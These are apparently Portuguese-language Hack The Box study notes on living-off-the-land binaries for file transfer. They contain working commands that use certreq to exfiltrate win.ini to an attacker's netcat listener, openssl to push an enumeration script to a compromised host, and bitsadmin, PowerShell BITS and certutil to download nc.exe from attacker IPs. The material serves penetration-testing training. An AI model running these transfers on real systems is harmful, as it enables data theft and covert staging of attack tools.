A frase "Vivendo da terra" foi cunhada por Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) & Matt Graeber [@mattifestation](https://twitter.com/mattifestation) às [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw).

O termo LOLBins ( Viver dos binários da terra ) veio de uma discussão no Twitter sobre o que chamar de binários que um invasor pode usar para executar ações além do objetivo original. Atualmente, existem dois sites que agregam informações sobre os binários Living off the Land:

- [Projeto LOLBAS para Binários do Windows](https://lolbas-project.github.io/)
- [GTFOBins para binários Linux](https://gtfobins.github.io/)

Viver fora dos binários da terra pode ser usado para executar funções como:

- Download
- Carregar
- Execução de Comando
- Leitura de arquivo
- Gravação de arquivo
- Bypasses

Esta seção se concentrará no uso de projetos LOLBAS e GTFOBins e fornecerá exemplos para funções de download e upload em sistemas Windows e Linux.

## Usando o projeto LOLBAS e GTFOBins

[LOLBAS para Windows](https://lolbas-project.github.io/#) e [GTFOBins para Linux](https://gtfobins.github.io/) são sites onde podemos procurar binários que podemos usar para diferentes funções.

### LOLBAS

Para procurar funções de download e upload em [LOLBAS](https://lolbas-project.github.io/) nós podemos usar `/download` ou `/upload`.

![[Pasted image 20230703215439.png]]

Vamos usar [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) como um exemplo.

Precisamos ouvir em uma porta do nosso host de ataque o tráfego recebido usando o Netcat e, em seguida, executar o certreq.exe para fazer upload de um arquivo.

#### Carregue win.ini no nosso Pwnbox

```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

Isso enviará o arquivo para a sessão Netcat e podemos copiar e colar seu conteúdo.

#### Arquivo recebido em nossa sessão Netcat

```shell-session
casluxd@htb[/htb]$ sudo nc -lvnp 80

listening on [any] 80 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Se você receber um erro ao executar `certreq.exe`, a versão que você está usando pode não conter o `-Post` parâmetro. Você pode baixar uma versão atualizada [aqui](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) e tente novamente.

### GTFOBins

Para procurar a função de download e upload em [GTFOBins para binários Linux](https://gtfobins.github.io/), nós podemos usar `+file download` ou `+file upload`.

![[Pasted image 20230703215608.png]]

Vamos usar [OpenSSL](https://www.openssl.org/). É frequentemente instalado e frequentemente incluído em outras distribuições de software, com os administradores de sistemas usando-o para gerar certificados de segurança, entre outras tarefas. O OpenSSL pode ser usado para enviar arquivos "estilo nc."

Precisamos criar um certificado e iniciar um servidor em nosso Pwnbox.

```shell-session
casluxd@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

#### Levante o servidor em nosso Pwnbox

```shell-session
casluxd@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Em seguida, com o servidor em execução, precisamos baixar o arquivo da máquina comprometida.

#### Baixar arquivo da máquina comprometida

```shell-session
casluxd@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Outras ferramentas comuns de Living off the Land

### Função de download do Bitsadmin

O [Serviço de transferência inteligente de fundo ( BITS )](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) pode ser usado para baixar arquivos de sites HTTP e compartilhamentos SMB. Ele "inteligentemente" verifica a utilização do host e da rede em consideração para minimizar o impacto no trabalho em primeiro plano do usuário.

#### Download de arquivo com Bitsadmin

```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

O PowerShell também permite a interação com o BITS, permite downloads e uploads de arquivos, suporta credenciais e pode usar servidores proxy especificados.

```powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```

### Certutil

Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) descobriu que o Certutil pode ser usado para baixar arquivos arbitrários. Está disponível em todas as versões do Windows e tem sido uma técnica popular de transferência de arquivos, servindo como defacto `wget` para Windows. No entanto, a Interface de verificação de antimalware ( AMSI ) atualmente detecta isso como uso malicioso de Certutil.

#### Faça o download de um arquivo com Certutil

```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

## Prática Extra

Vale a pena ler os sites LOLBAS e GTFOBins e experimentar o maior número possível de métodos de transferência de arquivos. Quanto mais profundo, melhor. Você nunca sabe quando precisará de um desses binários durante uma avaliação e economizará tempo se você já tiver notas detalhadas sobre várias opções. Alguns dos binários que podem ser aproveitados para transferências de arquivos podem surpreendê-lo.